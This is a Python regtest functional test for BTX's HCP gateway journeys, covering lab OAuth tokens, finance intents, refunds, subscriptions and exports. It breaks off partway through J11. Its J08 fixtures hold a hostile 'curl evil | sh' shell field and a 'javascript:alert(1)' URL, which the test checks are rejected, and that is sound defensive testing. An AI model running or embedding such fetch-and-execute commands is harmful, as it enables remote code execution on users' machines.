#!/usr/bin/env python3
# Copyright (c) 2026 The BTX developers
# Distributed under the MIT software license, see the accompanying
# file COPYING or https://opensource.org/license/mit/.
"""J01–J12 process-tier HCP journeys against two loopback gateways + walletless client.

Isolated regtest only. Never production btxd. automatic_spend_atoms stays 0.
OAUTH_LAB is the in-process loopback issuer on btx-hcpd, not a live CEX IdP.
Legs that need PlanLocal / CompleteConversion / ForceBroadcastUnknown / Persist /
live CEX/HSM/CUDA are logged HONEST_NOT_RUN — they are not relabeled PASS.
"""

import json
import socket
import subprocess
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

from test_framework.authproxy import JSONRPCException
from test_framework.test_framework import BitcoinTestFramework, SkipTest
from test_framework.util import get_datadir_path

MATMUL_OFF_ARGS = [
    "-regtestmatmulbindingheight=2147483647",
    "-regtestmatmulproductdigestheight=2147483647",
    "-regtestmatmulv4height=2147483647",
    "-regtestmatmulrequireproductpayload=0",
]

API_BASE = "https://exchange.example/btx/hcp/v1"
CORE = "111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111"
RECIPE = "333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333"
VERIFIER = "pkce-verifier-demo-aaaa"
PORT_A = 18782
PORT_B = 18783


def pjson(obj):
    return json.dumps(obj, sort_keys=True, separators=(",", ":"), ensure_ascii=False).encode()


def amounts(principal="1000"):
    p = int(principal)
    fee, svc, tax = 30, 20, 0
    return {
        "principal_atoms": str(p),
        "network_fee_cap_atoms": str(fee),
        "service_fee_atoms": str(svc),
        "tax_atoms": str(tax),
        "max_total_debit_atoms": str(p + fee + svc + tax),
    }


class ModelNetHcpJourneys(BitcoinTestFramework):
    def set_test_params(self):
        self.num_nodes = 1
        self.setup_clean_chain = True
        self.extra_args = [[
            "-nomodelnet",
            "-modelnet=0",
            *MATMUL_OFF_ARGS,
        ]]
        self.procs = []
        self.not_run = []

    def setup_nodes(self):
        self.add_nodes(self.num_nodes, extra_args=self.extra_args)
        self.start_nodes()

    def skip_test_if_missing_module(self):
        self.skip_if_platform_not_posix()
        builddir = self.config["environment"].get("BUILDDIR")
        self.hcpd = Path(builddir) / "bin" / "btx-hcpd"
        self.hosted = Path(builddir) / "bin" / "btx-hosted"
        if not self.hcpd.is_file():
            raise SkipTest("btx-hcpd not found")
        if not self.hosted.is_file():
            raise SkipTest("btx-hosted not found")

    def _honest(self, journey, reason):
        self.not_run.append((journey, reason))
        self.log.info("HONEST_NOT_RUN %s: %s", journey, reason)

    def _ecode(self, obj):
        err = obj.get("error") if isinstance(obj, dict) else None
        if isinstance(err, dict):
            return str(err.get("code") or "")
        return ""

    def _dump(self, obj):
        return json.dumps(obj, sort_keys=True)

    def _start(self, name, port, finance=False):
        d = Path(get_datadir_path(self.options.tmpdir, 0)) / name
        d.mkdir(parents=True, exist_ok=True)
        argv = [str(self.hcpd), f"-bind=127.0.0.1:{port}", f"-datadir={d}", f"-instance={name}"]
        argv.append("-finance=1" if finance else "-walletless")
        log = open(d / "hcpd.log", "w", encoding="utf-8")
        p = subprocess.Popen(argv, stdout=log, stderr=subprocess.STDOUT)
        for _ in range(50):
            if p.poll() is not None:
                break
            try:
                s = socket.create_connection(("127.0.0.1", port), 0.2)
                s.close()
                self.procs.append({"name": name, "proc": p, "log": log, "port": port, "datadir": d})
                return
            except OSError:
                time.sleep(0.1)
        p.terminate()
        log.close()
        raise RuntimeError(name)

    def _stop_one(self, name):
        kept = []
        for item in self.procs:
            if item["name"] != name:
                kept.append(item)
                continue
            p, log = item["proc"], item["log"]
            if p.poll() is None:
                p.terminate()
                try:
                    p.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    p.kill()
            log.close()
        self.procs = kept

    def _stop(self):
        for item in list(self.procs):
            self._stop_one(item["name"])
        self.procs = []

    def _get(self, url):
        with urllib.request.urlopen(url, timeout=5) as r:
            return json.loads(r.read().decode()), r.status

    def _http(self, method, url, body=None, headers=None, expect_error=False):
        data = None if body is None else (body if isinstance(body, (bytes, bytearray)) else pjson(body))
        hdrs = {"Accept": "application/json"}
        if data is not None:
            hdrs["Content-Type"] = "application/json"
        if headers:
            hdrs.update(headers)
        req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
        try:
            with urllib.request.urlopen(req, timeout=5) as r:
                raw = r.read()
                try:
                    parsed = json.loads(raw.decode()) if raw else {}
                except (json.JSONDecodeError, UnicodeDecodeError):
                    parsed = {"raw_bytes": len(raw)}
                return parsed, r.status
        except urllib.error.HTTPError as e:
            payload = e.read()
            try:
                parsed = json.loads(payload.decode()) if payload else {}
            except (json.JSONDecodeError, UnicodeDecodeError):
                parsed = {"raw_bytes": len(payload)}
            if expect_error:
                return parsed, e.code
            raise

    def _raw(self, method, url, headers=None):
        """urlopen without json.loads (SSE /events/stream is not a JSON document)."""
        hdrs = {}
        if headers:
            hdrs.update(headers)
        req = urllib.request.Request(url, method=method, headers=hdrs)
        try:
            with urllib.request.urlopen(req, timeout=5) as r:
                raw = r.read()
                text = raw.decode(errors="replace")
                info = r.info()
                if hasattr(info, "get_content_type"):
                    ctype = info.get_content_type()
                else:
                    ctype = (r.headers.get("Content-Type") or "").split(";")[0].strip()
                return text, r.status, ctype
        except urllib.error.HTTPError as e:
            payload = e.read()
            text = payload.decode(errors="replace") if payload else ""
            hdr = e.headers
            if hdr is not None and hasattr(hdr, "get_content_type"):
                ctype = hdr.get_content_type()
            elif hdr is not None:
                ctype = (hdr.get("Content-Type") or "").split(";")[0].strip()
            else:
                ctype = ""
            return text, e.code, ctype

    def _lab_token(self, port, verifier=VERIFIER, account="account-demo", scopes=None):
        pkce, _ = self._get(f"http://127.0.0.1:{port}/lab/pkce?verifier={verifier}")
        assert pkce.get("lab_only") is True
        q = {
            "account": account,
            "client_id": "client-demo",
            "redirect": "https://app.example/cb",
            "state": "state-1",
            "challenge": pkce["challenge"],
        }
        if scopes:
            q["scopes"] = ",".join(scopes)
        auth, _ = self._get(f"http://127.0.0.1:{port}/lab/authorize?{urllib.parse.urlencode(q)}")
        tq = urllib.parse.urlencode({
            "code": auth["code"],
            "verifier": verifier,
            "redirect": "https://app.example/cb",
        })
        tok, _ = self._get(f"http://127.0.0.1:{port}/lab/token?{tq}")
        assert tok["token_type"] == "DPoP"
        assert tok.get("lab_only") is True
        return tok["access_token"]

    def _dpop(self, port, method, path, token):
        q = urllib.parse.urlencode({
            "htm": method,
            "htu": API_BASE + path,
            "access_token": token,
        })
        proof, _ = self._get(f"http://127.0.0.1:{port}/lab/dpop?{q}")
        return json.dumps(proof, separators=(",", ":"))

    def _auth_headers(self, port, method, path, token):
        return {
            "Authorization": "Bearer " + token,
            "DPoP": self._dpop(port, method, path, token),
        }

    def _assert_spend_zero(self, obj):
        assert obj.get("automatic_spend_atoms") == 0

    def _j01_free_hosted_discovery(self):
        a, st = self._get(f"http://127.0.0.1:{PORT_A}/profile")
        assert st == 200
        assert a["object_type"] == "ProviderProfile"
        body = a["body"]
        profiles = body.get("supported_profiles") or []
        assert "DISCOVERY" in profiles
        assert "HANDOFF" in profiles
        assert "FUNDING" not in profiles
        modes = body.get("custody_modes") or []
        assert "DISCOVERY_ONLY" in modes
        assert "CUSTODIAL" not in modes
        health, _ = self._get(f"http://127.0.0.1:{PORT_A}/health")
        assert health["ok"] is True
        self._assert_spend_zero(health)
        assert health["walletless"] is True
        assert health["finance"] is False
        assert health.get("instance") == "A"
        hosted = json.loads(subprocess.check_output([str(self.hosted), "walletless"], text=True))
        assert hosted["walletless"] is True
        assert hosted["start_wallet"] is False
        assert hosted.get("start_mining") is False
        self._assert_spend_zero(hosted)
        hits, _ = self._http("POST", f"http://127.0.0.1:{PORT_A}/capabilities/search", {})
        assert "hits" in hits
        assert hits.get("incomplete") is True
        dump = self._dump(hits)
        assert "local_paths" not in dump
        assert "PROMPT" not in dump
        econ, st = self._get(f"http://127.0.0.1:{PORT_A}/economy/demo-target")
        assert st == 200
        assert econ.get("anchor_required_for_finance") is True
        pkg_text, st, ctype = self._raw("GET", f"http://127.0.0.1:{PORT_A}/packages/{CORE}")
        assert st == 200
        assert (ctype or "").split(";")[0].strip() == "application/octet-stream"
        assert pkg_text.startswith("BTXPKG")
        missing, st = self._http("GET", f"http://127.0.0.1:{PORT_A}/packages/{'00' * 48}", expect_error=True)
        assert st == 404
        rpc, st = self._http("POST", f"http://127.0.0.1:{PORT_A}/rpc", {"method": "getbalance"}, expect_error=True)
        assert st == 404
        assert self._ecode(rpc) == "GENERIC_RPC_DISABLED"
        fin, st = self._http("POST", f"http://127.0.0.1:{PORT_A}/finance/intents", {}, expect_error=True)
        assert st == 403
        assert self._ecode(fin) == "FUNDING_DISABLED"
        qfail, st = self._http("POST", f"http://127.0.0.1:{PORT_A}/finance/quotes", {}, expect_error=True)
        assert st == 403
        assert self._ecode(qfail) == "FUNDING_DISABLED"
        subm, st = self._get(f"http://127.0.0.1:{PORT_A}/research/submissions/sub-j01")
        assert st == 200
        assert subm.get("state") == "UNKNOWN"
        # Signed-good accept is _hosted_accept_good (RunHostedCli seeds lab + re-signs).
        # Unenrolled fail-close is no longer reachable for structurally good JSON.
        self._honest(
            "J01",
            "native-network acquire + EnsureLocal RUNTIME_READY need in-process grant/PlanLocal; "
            "not exposed on loopback hcpd HTTP",
        )

    def _j02_locality_wins(self):
        hits, st = self._http(
            "POST",
            f"http://127.0.0.1:{PORT_A}/capabilities/search",
            {"q": "/home/secret/models", "limit": 8},
        )
        assert st == 200
        dump = self._dump(hits).lower()
        assert "local_paths" not in dump
        assert "installation_directory" not in dump
        assert "inventory_reported" not in dump
        assert "/home/secret/models" not in dump
        for hit in hits.get("hits") or []:
            assert hit.get("evidence_complete") is False
        # No /plan on hcpd HTTP. This class starts btxd with -nomodelnet and no
        # helper — do not invent a modeld (other J legs assume HTTP-only hcpd).
        # Keep HONEST_NOT_RUN for HTTP-only J02; do not relabel J02 PASS.
        # Process-tier LAN vs internet is remaining_04 in feature_hcp_remaining.py
        # and native unique_todo_planhcplocal_lan_wins.
        # If the existing node can still proxy puthcplocalitysources +
        # planhcplocal, prove LAN wins; else honest-log.
        planned = False
        if getattr(self, "nodes", None):
            try:
                put = self.nodes[0].puthcplocalitysources({
                    "lan": {"id": "lan", "ttc_ms": 20},
                    "internet": {"id": "cex-hint", "ttc_ms": 8000},
                })
                assert put.get("inventory_reported") is not True
                plan = self.nodes[0].planhcplocal({"recipe_id": RECIPE})
                selected = plan.get("selected_source")
                assert plan.get("inventory_reported") is not True
                assert selected != "internet:cex-hint"
                assert str(selected).startswith("lan:")
                planned = True
            except JSONRPCException as exc:
                self.log.info("J02 planhcplocal via btxd unavailable (no helper): %s", exc)
        if planned:
            self._honest(
                "J02",
                "live CUDA / btx-capabilityd DMA not run; planhcplocal LAN-vs-internet is lab TTC maps only",
            )
        else:
            self._honest(
                "J02",
                "PlanLocal LAN-vs-internet TTC (PutResidentBase/PutLanSource) is native-only; "
                "no HTTP /plan on btx-hcpd; this test starts btxd with -nomodelnet and no helper",
            )

    def _j03_release_funding(self):
        pkce1, _ = self._get(f"http://127.0.0.1:{PORT_B}/lab/pkce?verifier={VERIFIER}")
        pkce2, _ = self._get("http://127.0.0.1:{}/lab/pkce?verifier=verifier-session-two-yyyy".format(PORT_B))
        assert pkce1["challenge"] != pkce2["challenge"]
        q = urllib.parse.urlencode({
            "account": "account-demo",
            "challenge": pkce1["challenge"],
            "redirect": "https://app.example/cb",
        })
        auth, _ = self._get(f"http://127.0.0.1:{PORT_B}/lab/authorize?{q}")
        tq = urllib.parse.urlencode({
            "code": auth["code"],
            "verifier": "verifier-session-two-yyyy",
            "redirect": "https://app.example/cb",
        })
        bad, st = self._http("GET", f"http://127.0.0.1:{PORT_B}/lab/token?{tq}", expect_error=True)
        assert st == 400
        assert self._ecode(bad) == "PKCE_MISMATCH"

        read_tok = self._lab_token(
            PORT_B, verifier="pkce-verifier-read-cccc", scopes=["catalog:read"]
        )
        rh = self._auth_headers(PORT_B, "POST", "/finance/quotes", read_tok)
        scoped, st = self._http(
            "POST", f"http://127.0.0.1:{PORT_B}/finance/quotes", {}, headers=rh, expect_error=True
        )
        assert st == 401
        assert self._ecode(scoped) == "SCOPE_DENIED"

        unauth, st = self._http("POST", f"http://127.0.0.1:{PORT_B}/finance/quotes", {}, expect_error=True)
        assert st == 401
        assert self._ecode(unauth) == "UNAUTHENTICATED"

        token = self._lab_token(PORT_B)
        self.token = token
        qh = self._auth_headers(PORT_B, "POST", "/finance/quotes", token)
        quote, st = self._http("POST", f"http://127.0.0.1:{PORT_B}/finance/quotes", {}, headers=qh)
        assert st == 201
        assert quote["object_type"] == "FundingQuote"
        assert quote["body"]["quote_kind"] == "FIRM"
        assert quote["body"]["amounts"]["principal_atoms"] == "1000"
        assert quote["body"]["action"] == "FUND_RELEASE"
        qid = quote["body"]["quote_id"]
        replay, st = self._http(
            "POST", f"http://127.0.0.1:{PORT_B}/finance/quotes", {}, headers=qh, expect_error=True
        )
        assert st == 401
        assert self._ecode(replay) == "DPOP_BINDING"

        ih = self._auth_headers(PORT_B, "POST", "/finance/intents", token)
        created, st = self._http(
            "POST",
            f"http://127.0.0.1:{PORT_B}/finance/intents",
            {"client_operation_id": "j03-process", "quote_id": qid},
            headers=ih,
        )
        assert st == 201
        assert created["object_type"] == "FinanceIntent"
        iid = created["body"]["intent_id"]
        self.j03_iid = iid
        ah = self._auth_headers(PORT_B, "POST", f"/finance/intents/{iid}/authorize", token)
        az, st = self._http("POST", f"http://127.0.0.1:{PORT_B}/finance/intents/{iid}/authorize", {}, headers=ah)
        assert st == 200
        assert az.get("state") == "AUTHORIZED"
        sh = self._auth_headers(PORT_B, "POST", f"/finance/intents/{iid}/submit", token)
        sub, st = self._http("POST", f"http://127.0.0.1:{PORT_B}/finance/intents/{iid}/submit", {}, headers=sh)
        assert st == 202
        assert sub.get("state") == "ACCEPTED"
        assert sub.get("funded") is False
        assert sub.get("txid")
        self.j03_sub = sub
        stt, _ = self._http(
            "GET",
            f"http://127.0.0.1:{PORT_B}/finance/intents/{iid}",
            headers={"Authorization": "Bearer " + token},
        )
        assert stt.get("runtime_ready") is False
        assert stt.get("conversion_complete") is False
        assert stt.get("knowledge_disclosed") is False
        assert stt.get("funding_failed") is False
        assert stt.get("state") == "ACCEPTED"
        assert stt.get("receipt_state") == "NATIVE_PENDING"
        hb, _ = self._get(f"http://127.0.0.1:{PORT_B}/health")
        self._assert_spend_zero(hb)
        bals, _ = self._http(
            "GET",
            f"http://127.0.0.1:{PORT_B}/treasury/balances",
            headers={"Authorization": "Bearer " + token},
        )
        assert bals["available_atoms"] != "1000000"
        assert "PROMPT" not in self._dump(bals)
        opg, st = self._http(
            "GET",
            f"http://127.0.0.1:{PORT_B}/operations/{iid}",
            headers={"Authorization": "Bearer " + token},
        )
        assert st == 200
        assert opg.get("operation_id") == iid
        rid = sub.get("receipt_id")
        assert rid
        rec1, st = self._http(
            "GET",
            f"http://127.0.0.1:{PORT_B}/finance/receipts/{rid}",
            headers={"Authorization": "Bearer " + token},
        )
        assert st == 200
        assert rec1.get("spv_claimed") is False
        assert rec1.get("full_validation_claimed") is False
        assert rec1.get("authority_label") == "HOSTED_ATTESTED"
        self._honest(
            "J03",
            "OAUTH_LAB loopback PKCE+DPoP is not a live CEX IdP; native-chain confirmations "
            "and HSM signing are not HTTP-settable on btx-hcpd",
        )

    def _j04_conversion_partial(self):
        token = self.token
        ih = self._auth_headers(PORT_B, "POST", "/finance/intents", token)
        created, st = self._http(
            "POST",
            f"http://127.0.0.1:{PORT_B}/finance/intents",
            {"client_operation_id": "j04-conv", "amounts": amounts("1000")},
            headers=ih,
        )
        assert st == 201
        iid = created["body"]["intent_id"]
        again, st = self._http(
            "POST",
            f"http://127.0.0.1:{PORT_B}/finance/intents",
            {"client_operation_id": "j04-conv", "amounts": amounts("1000")},
            headers=self._auth_headers(PORT_B, "POST", "/finance/intents", token),
        )
        assert st == 200
        assert again["body"]["intent_id"] == iid
        conflict, st = self._http(
            "POST",
            f"http://127.0.0.1:{PORT_B}/finance/intents",
            {"client_operation_id": "j04-conv", "amounts": amounts("2000")},
            headers=self._auth_headers(PORT_B, "POST", "/finance/intents", token),
            expect_error=True,
        )
        assert st == 409
        assert self._ecode(conflict) == "IDEMPOTENCY_CONFLICT"
        # J03 retry is the same client_operation_id → same intent, not a second funding.
        j03_again, st = self._http(
            "POST",
            f"http://127.0.0.1:{PORT_B}/finance/intents",
            {"client_operation_id": "j03-process"},
            headers=self._auth_headers(PORT_B, "POST", "/finance/intents", token),
        )
        assert j03_again["body"]["intent_id"] == self.j03_iid
        stt, _ = self._http(
            "GET",
            f"http://127.0.0.1:{PORT_B}/finance/intents/{iid}",
            headers={"Authorization": "Bearer " + token},
        )
        assert stt.get("conversion_complete") is False
        bals, _ = self._http(
            "GET",
            f"http://127.0.0.1:{PORT_B}/treasury/balances",
            headers={"Authorization": "Bearer " + token},
        )
        assert bals.get("converted_retained_atoms") == "0"
        self._honest(
            "J04",
            "CompleteConversion + ExpireQuote are native helpers; HTTP cannot mark conversion "
            "complete while expiring funding terms",
        )

    def _j05_unknown_broadcast(self):
        token = self.token
        iid = self.j03_iid
        sub = self.j03_sub
        sh2 = self._auth_headers(PORT_B, "POST", f"/finance/intents/{iid}/submit", token)
        sub2, st = self._http("POST", f"http://127.0.0.1:{PORT_B}/finance/intents/{iid}/submit", {}, headers=sh2)
        assert st == 202
        assert sub2.get("txid") == sub.get("txid")
        assert sub2.get("funded") is False
        bals_a, _ = self._http(
            "GET",
            f"http://127.0.0.1:{PORT_B}/treasury/balances",
            headers={"Authorization": "Bearer " + token},
        )
        bals_b, _ = self._http(
            "GET",
            f"http://127.0.0.1:{PORT_B}/treasury/balances",
            headers={"Authorization": "Bearer " + token},
        )
        assert bals_a["available_atoms"] == bals_b["available_atoms"]
        if sub.get("signed_tx_hex") and sub2.get("signed_tx_hex"):
            assert sub["signed_tx_hex"] == sub2["signed_tx_hex"]
        self._honest(
            "J05",
            "ForceBroadcastUnknown / gateway-worker restart are not HTTP; process-tier proves "
            "identical txid on retry and no false refund of ACCEPTED",
        )
        ch = self._auth_headers(PORT_B, "POST", f"/finance/intents/{iid}/cancel", token)
        canc, st = self._http("POST", f"http://127.0.0.1:{PORT_B}/finance/intents/{iid}/cancel", {}, headers=ch)
        assert st == 202
        assert canc.get("state") == "RECONCILE"
        assert canc.get("false_refund") is False
        assert canc.get("hold_retained") is True
        rec, _ = self._http(
            "GET",
            f"http://127.0.0.1:{PORT_B}/finance/intents/{iid}/receipts",
            headers={"Authorization": "Bearer " + token},
        )
        assert "ids" in rec
        assert isinstance(rec["ids"], list)
        hb, _ = self._get(f"http://127.0.0.1:{PORT_B}/health")
        self._assert_spend_zero(hb)

    def _j06_no_award_refund(self):
        token = self.token
        ph = self._auth_headers(PORT_B, "POST", "/policies", token)
        pol, st = self._http(
            "POST",
            f"http://127.0.0.1:{PORT_B}/policies",
            {
                "policy_id": "policy-j06",
                "lifetime_principal_atoms": "1000",
                "allowed_actions": ["FUND_RELEASE"],
                "refund_replenishes_lifetime": False,
            },
            headers=ph,
        )
        assert st == 201
        assert pol.get("policy_id") == "policy-j06"
        bals0, _ = self._http(
            "GET",
            f"http://127.0.0.1:{PORT_B}/treasury/balances",
            headers={"Authorization": "Bearer " + token},
        )
        ih = self._auth_headers(PORT_B, "POST", "/finance/intents", token)
        created, st = self._http(
            "POST",
            f"http://127.0.0.1:{PORT_B}/finance/intents",
            {"client_operation_id": "j06-no-award", "policy_id": "policy-j06", "amounts": amounts("1000")},
            headers=ih,
        )
        assert st == 201
        iid = created["body"]["intent_id"]
        bals1, _ = self._http(
            "GET",
            f"http://127.0.0.1:{PORT_B}/treasury/balances",
            headers={"Authorization": "Bearer " + token},
        )
        assert int(bals1["available_atoms"]) < int(bals0["available_atoms"])
        ch = self._auth_headers(PORT_B, "POST", f"/finance/intents/{iid}/cancel", token)
        canc, st = self._http("POST", f"http://127.0.0.1:{PORT_B}/finance/intents/{iid}/cancel", {}, headers=ch)
        # HTTP 400 is not a refund. Process-tier cancel is 202 + hold_released.
        assert st == 202
        assert canc.get("state") == "CANCELLED"
        assert canc.get("hold_released") is True
        after, gst = self._http(
            "GET",
            f"http://127.0.0.1:{PORT_B}/finance/intents/{iid}",
            headers={"Authorization": "Bearer " + token},
        )
        assert gst == 200
        assert after.get("state") == "CANCELLED"
        after_dump = self._dump(after)
        assert "refund_template" not in after_dump
        assert after.get("refund_required") is not True
        assert after.get("refund_template") in (None, False)
        bals2, _ = self._http(
            "GET",
            f"http://127.0.0.1:{PORT_B}/treasury/balances",
            headers={"Authorization": "Bearer " + token},
        )
        assert bals2["available_atoms"] == bals0["available_atoms"]
        assert bals2["refunded_atoms"] == bals0["refunded_atoms"]
        second, st = self._http(
            "POST",
            f"http://127.0.0.1:{PORT_B}/finance/intents",
            {"client_operation_id": "j06-lifetime-2", "policy_id": "policy-j06", "amounts": amounts("1000")},
            headers=self._auth_headers(PORT_B, "POST", "/finance/intents", token),
            expect_error=True,
        )
        assert st == 403
        assert self._ecode(second) == "LIFETIME_CAP"
        pg, st = self._http(
            "GET",
            f"http://127.0.0.1:{PORT_B}/policies/policy-j06",
            headers={"Authorization": "Bearer " + token},
        )
        assert st == 200
        assert pg.get("policy_id") == "policy-j06"
        self._honest(
            "J06",
            "custodial native-height refund credit (SetRefundHeight / refunded_atoms) is not an HTTP effect; "
            "process-tier proves hold release + lifetime not replenished",
        )

    def _j07_subscription_concurrency(self):
        token = self.token
        results = []
        errors = []

        def _create():
            try:
                suh = self._auth_headers(PORT_B, "POST", "/subscriptions", token)
                subo, st = self._http("POST", f"http://127.0.0.1:{PORT_B}/subscriptions", {}, headers=suh)
                results.append((subo, st))
            except Exception as exc:  # noqa: BLE001 — surface in parent thread
                errors.append(exc)

        t1 = threading.Thread(target=_create)
        t2 = threading.Thread(target=_create)
        t1.start()
        t2.start()
        t1.join()
        t2.join()
        assert not errors
        assert len(results) == 2
        for subo, st in results:
            assert st == 201
            assert subo.get("finite") is True
            assert subo.get("subscription_id")
        ids = {results[0][0]["subscription_id"], results[1][0]["subscription_id"]}
        assert len(ids) == 2
        sid = results[0][0]["subscription_id"]
        rh = self._auth_headers(PORT_B, "POST", f"/subscriptions/{sid}/revoke", token)
        rv, st = self._http("POST", f"http://127.0.0.1:{PORT_B}/subscriptions/{sid}/revoke", {}, headers=rh)
        assert st == 200
        assert rv.get("revoked") is True
        assert rv.get("new_signatures") is False
        ev1, st = self._http(
            "GET",
            f"http://127.0.0.1:{PORT_B}/events",
            headers={"Authorization": "Bearer " + token},
        )
        assert st == 200
        assert ev1.get("at_least_once") is True
        assert ev1.get("exactly_once") is False
        keys1 = [(e.get("seq"), e.get("business_key")) for e in (ev1.get("items") or [])]
        ev2, st = self._http(
            "GET",
            f"http://127.0.0.1:{PORT_B}/events",
            headers={"Authorization": "Bearer " + token},
        )
        assert st == 200
        keys2 = [(e.get("seq"), e.get("business_key")) for e in (ev2.get("items") or [])]
        assert keys1 == keys2
        sse, st, ctype = self._raw(
            "GET",
            f"http://127.0.0.1:{PORT_B}/events/stream",
            headers={"Authorization": "Bearer " + token},
        )
        assert st == 200
        assert (ctype or "").split(";")[0].strip() == "text/event-stream"
        assert sse.startswith("event: hcp")
        self._honest(
            "J07",
            "DeliverEventDuplicates / multi-replica outbox is native-only; HTTP has no "
            "subscription-event → intent fan-in",
        )

    def _hosted_accept_good(self):
        """btx-hosted accept of a structurally good CapabilityHandoff (no shell).

        RunHostedCli seeds lab state and re-signs unsigned-but-good envelopes.
        rc==0 and wallet_touched is false. J08 FORBIDDEN_FIELD is unchanged.
        """
        a, st = self._get(f"http://127.0.0.1:{PORT_A}/profile")
        assert st == 200
        provider_id = a.get("body", {}).get("provider_id") or "provider-demo"
        good = {
            "object_type": "CapabilityHandoff",
            "body": {
                "version": 1,
                "provider_id": provider_id,
                "device_id": "device-demo",
                "request_nonce": "demo-nonce-not-production",
                "handoff_id": "handoff-accept-good",
                "package": {"package_core_id": CORE, "recipe_id": RECIPE},
                "issued_at_ms": "1",
                "expires_at_ms": "9999999999999",
            },
        }
        assert "shell" not in good["body"]
        good_path = Path(get_datadir_path(self.options.tmpdir, 0)) / "good-handoff.json"
        good_path.write_text(json.dumps(good), encoding="utf-8")
        proc = subprocess.run(
            [str(self.hosted), "accept", str(good_path)],
            capture_output=True,
            text=True,
        )
        blob = (proc.stdout or "") + (proc.stderr or "")
        assert proc.returncode == 0, blob
        text = (proc.stdout or "").strip() or (proc.stderr or "").strip()
        acc = json.loads(text)
        assert acc.get("wallet_touched") is False
        assert acc.get("automatic_spend_atoms") in (0, "0", None)
        assert "WALLET_TOUCHED\":TRUE" not in blob.upper().replace(" ", "")
        self.log.info(
            "J08-good btx-hosted accept handoff_id=%s spend=0",
            acc.get("handoff_id") or good["body"]["handoff_id"],
        )

    def _j08_malicious_provider(self):
        bad = {
            "object_type": "CapabilityHandoff",
            "body": {
                "version": 1,
                "provider_id": "evil",
                "device_id": "device-demo",
                "request_nonce": "demo-nonce-not-production",
                "shell": "curl evil | sh",
                "package": {"package_core_id": CORE, "recipe_id": RECIPE},
                "issued_at_ms": "1",
                "expires_at_ms": "9999999999999",
            },
            "body_id": "00" * 48,
            "signer_key_id": "unsigned",
            "signature": None,
        }
        bad_path = Path(get_datadir_path(self.options.tmpdir, 0)) / "evil-handoff.json"
        bad_path.write_text(json.dumps(bad), encoding="utf-8")
        proc = subprocess.run(
            [str(self.hosted), "accept", str(bad_path)],
            capture_output=True,
            text=True,
        )
        assert proc.returncode != 0
        blob = proc.stdout + proc.stderr
        assert "FORBIDDEN_FIELD" in blob
        url_bad = {
            "object_type": "CapabilityHandoff",
            "body": {
                "version": 1,
                "provider_id": "evil",
                "device_id": "device-demo",
                "request_nonce": "demo-nonce-not-production",
                "executable_url": "javascript:alert(1)",
                "package": {"package_core_id": CORE, "recipe_id": RECIPE},
                "issued_at_ms": "1",
                "expires_at_ms": "9999999999999",
            },
            "body_id": "00" * 48,
            "signer_key_id": "unsigned",
            "signature": None,
        }
        url_path = Path(get_datadir_path(self.options.tmpdir, 0)) / "evil-url.json"
        url_path.write_text(json.dumps(url_bad), encoding="utf-8")
        proc2 = subprocess.run(
            [str(self.hosted), "accept", str(url_path)],
            capture_output=True,
            text=True,
        )
        assert proc2.returncode != 0
        assert "FORBIDDEN_FIELD" in (proc2.stdout + proc2.stderr)

    def _j09_provider_exit(self):
        a, _ = self._get(f"http://127.0.0.1:{PORT_A}/profile")
        b, _ = self._get(f"http://127.0.0.1:{PORT_B}/profile")
        assert a["object_type"] == "ProviderProfile"
        assert b["object_type"] == "ProviderProfile"
        ha, _ = self._get(f"http://127.0.0.1:{PORT_A}/health")
        hb, _ = self._get(f"http://127.0.0.1:{PORT_B}/health")
        assert ha.get("instance") == "A"
        assert hb.get("instance") == "B"
        assert ha.get("instance") != hb.get("instance")
        assert ha["walletless"] is True
        assert hb["finance"] is True
        self._assert_spend_zero(ha)
        self._assert_spend_zero(hb)
        econ_b, st = self._get(f"http://127.0.0.1:{PORT_B}/economy/demo-target")
        assert st == 200
        token = self.token
        # B's token is unknown on A — finance is not replayed across origins.
        stolen, st = self._http(
            "GET",
            f"http://127.0.0.1:{PORT_A}/finance/intents/{self.j03_iid}",
            headers={"Authorization": "Bearer " + token},
            expect_error=True,
        )
        assert st == 401
        assert self._ecode(stolen) == "TOKEN_INVALID"
        replay, st = self._http(
            "POST",
            f"http://127.0.0.1:{PORT_A}/finance/intents",
            {"client_operation_id": "j03-process"},
            headers=self._auth_headers(PORT_A, "POST", "/finance/intents", token),
            expect_error=True,
        )
        assert st == 403
        assert self._ecode(replay) == "FUNDING_DISABLED"
        pkg_a, st, _ = self._raw("GET", f"http://127.0.0.1:{PORT_A}/packages/{CORE}")
        assert st == 200
        assert pkg_a.startswith("BTXPKG")
        self._honest(
            "J09",
            "SwitchProvider() is native-only; process-tier proves independent instances and "
            "no cross-origin token/intent replay",
        )

    def _j10_custody_failure_drill(self):
        token = self.token
        xh = self._auth_headers(PORT_B, "POST", "/exports", token)
        ex, st = self._http(
            "POST",
            f"http://127.0.0.1:{PORT_B}/exports",
            {"include_secrets": True},
            headers=xh,
        )
        assert st == 202
        assert ex.get("self_custody_claimed") is False
        assert ex.get("include_secrets") is False
        assert ex.get("secrets_omitted") is True
        assert ex.get("custody_controller") == "CEX_CUSTODIAL_KEY"
        dump = self._dump(ex).lower()
        assert "wallet_seed" not in dump
        assert "private_key" not in dump
        eid = ex["export_id"]
        xg, st = self._http(
            "GET",
            f"http://127.0.0.1:{PORT_B}/exports/{eid}",
            headers={"Authorization": "Bearer " + token},
        )
        assert st == 200
        assert xg.get("ready") is False
        assert xg.get("retrieved") is True
        assert xg.get("self_custody_claimed") is False
        _, st = self._http(
            "GET",
            f"http://127.0.0.1:{PORT_B}/exports/export-missing",
            headers={"Authorization": "Bearer " + token},
            expect_error=True,
        )
        assert st == 404
        bdir = Path(get_datadir_path(self.options.tmpdir, 0)) / "B"
        persisted = (bdir / "hcp-state.json").is_file()
        # Persist-to-disk may now exist; live HSM restore/refund is still not this HTTP path.
        self._honest(
            "J10",
            ("hcp-state.json present on loopback; " if persisted else "no hcp-state.json; ")
            + "Restore-from-backup and live HSM refund remain native-only / HONEST_NOT_RUN",
        )
        self.j10_export = ex

    def _j11_fleet_browser(self):
        token = self.token
        dh = self._auth_headers(PORT_B, "POST", "/devices/enroll", token)
        en, st = self._http(
            "POST",
            f"http://127.0.0.1:{PORT_B}/devices/enroll",
            {"device_id": "device-j11"},
            headers=dh,
        )
        assert st == 201
        assert en.get("paired") is False
